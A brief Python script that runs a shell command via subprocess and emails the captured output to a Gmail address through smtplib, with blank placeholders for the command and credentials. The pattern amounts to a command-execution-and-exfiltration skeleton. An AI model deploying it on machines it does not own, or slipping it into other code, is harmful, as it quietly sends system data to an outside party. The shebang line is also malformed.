#!usr/bin/env python
import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)    #smtp.gmail.com (GOOGLE SMTP SERVER) at port 587
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)          #send mail method from (sender) to (reciever) with a message
    server.quit()

command = " "                                       #Enter the command
result = subprocess.check_output(command)
send_mail("email_address", "password ", result)    #Enter email address and password in the defined fields Format(email@gmail.com)